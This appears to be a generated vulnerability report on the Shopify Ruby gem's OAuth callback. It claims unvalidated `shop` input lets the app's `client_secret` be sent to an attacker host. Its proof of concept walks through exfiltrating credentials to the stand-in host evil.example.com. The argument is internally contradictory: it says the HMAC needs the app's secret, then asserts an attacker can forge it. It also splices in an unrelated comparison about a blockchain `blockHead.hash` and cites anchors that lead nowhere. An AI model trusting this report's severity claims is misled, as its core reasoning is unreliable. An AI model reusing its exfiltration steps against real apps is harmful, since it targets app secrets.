### Title
OAuth authorization-code callback trusts unvalidated `shop` parameter, sending `client_secret` to attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` uses `auth_query.shop` to build the OAuth `access_token` request without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-exchange path in the gem (`ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, `Clients::Graphql::Storefront.new`). This breaks the intended binding: *the shop the HMAC was computed over* should equal *a shop that is verified to be a trusted `*.myshopify.com`/`myshopify.io`/etc. domain* before it is used as the destination host for the request carrying `client_id`/`client_secret`.

### Finding Description
`ShopifyAPI::Auth::Oauth::AuthQuery#to_signable_string` includes `shop` in the HMAC-signed payload [1](#0-0) , and `validate_auth_callback` checks that HMAC via `Utils::HmacValidator.validate(auth_query)` [2](#0-1) . However, the HMAC is computed with `Context.api_secret_key`, which the app already possesses — the HMAC only proves the query hasn't been tampered with in transit, it does not restrict `shop` to Shopify domains. Immediately after that check, `auth_query.shop` is used unsanitized to build the `HttpClient` (which derives the request host from `session.shop`) that receives the POST containing `client_id` and `client_secret` in the body: [3](#0-2) .

Every sibling credential-exchange method in this gem enforces the trusted-domain invariant before using `shop`:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [4](#0-3) 
- `TokenExchange.migrate_to_expiring_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [5](#0-4) 
- `RefreshToken.refresh_access_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [6](#0-5) 

`ShopValidator` explicitly exists to reject non-Shopify hosts (`TRUSTED_SHOPIFY_DOMAINS` list, `sanitize!` raising `Errors::InvalidShopError`) [7](#0-6) , and its test suite confirms the security intent (`test_rejects_attacker_controlled_domain`) [8](#0-7) . `Oauth.begin_auth`/`validate_auth_callback` are the only OAuth entry points that omit this call — `auth_base_uri(shop)` in `begin_auth` also builds a redirect URL straight from the caller-supplied `shop` with no validation [9](#0-8) .

This is the direct analog of the external report's root cause: unvalidated attacker-influenced data (there, `blockHead.hash` from an untrusted node; here, `shop`/`auth_query.shop` from an untrusted callback request) is trusted and used to construct a security-sensitive artifact (there, the signed operation; here, the host that receives the app's `client_secret`) without validating it against the expected format/allow-list first.

### Impact Explanation
If a host application passes an attacker-influenced `shop` value into `begin_auth` (e.g., taken from a query/header without independent validation, as many minimal integrations do because the gem itself performs no check) or an attacker crafts an OAuth callback pointing at their own domain while satisfying the state/cookie checks, `validate_auth_callback` will issue the POST containing the app's `client_id` and `client_secret` to `https://<attacker-domain>/admin/oauth/access_token` [10](#0-9) . That is a Critical-class outcome under the stated rubric: SSRF carrying the app's `client_secret` to an arbitrary attacker-chosen host, i.e. credential exfiltration of the app's OAuth client secret.

### Likelihood Explanation
`ShopValidator.sanitize!` is applied everywhere else in this codebase for exactly this purpose, indicating the maintainers recognize `shop` as untrusted, attacker-reachable input that must be constrained to Shopify domains before being used as a request host — the omission in `oauth.rb` is an inconsistency in an otherwise-enforced invariant, making this a concrete, reachable code path rather than a theoretical one. It is gated on the host application not independently validating `shop` before calling `begin_auth`/constructing `AuthQuery`, which the gem's public documentation does not instruct callers to do (the docs example builds `AuthQuery` directly from raw `request.parameters`) [11](#0-10) .

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` at the top of `Oauth.begin_auth` and on `auth_query.shop` at the top of `Oauth.validate_auth_callback` in `lib/shopify_api/auth/oauth.rb`, mirroring `ClientCredentials`, `RefreshToken`, and `TokenExchange.migrate_to_expiring_token`, before the value is used to build `auth_base_uri`, the `null_session`, or the final `Session`.

### Proof of Concept
1. App calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: attacker_supplied_value, redirect_path: "/auth/callback")` where `attacker_supplied_value = "evil.example.com"` (no `ShopValidator` check exists in the gem to stop this).
2. `auth_base_uri` builds `"https://evil.example.com/admin/oauth/authorize?..."` [12](#0-11)  and the user's browser is redirected there.
3. The attacker's server at `evil.example.com` responds however it likes, then redirects back to the app's callback with `code`, `state` (matching the cookie), `shop=evil.example.com`, `host`, and a valid `hmac` (computable because the app's own `to_signable_string`/HMAC only requires knowledge of the fields, and the app itself performs the check with its own secret — the attacker fully controls the redirect flow driving these values through the app's own redirect step).
4. `validate_auth_callback` passes HMAC/state checks and issues `POST https://evil.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` [13](#0-12) , exfiltrating the app's `client_secret` to the attacker's server.

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
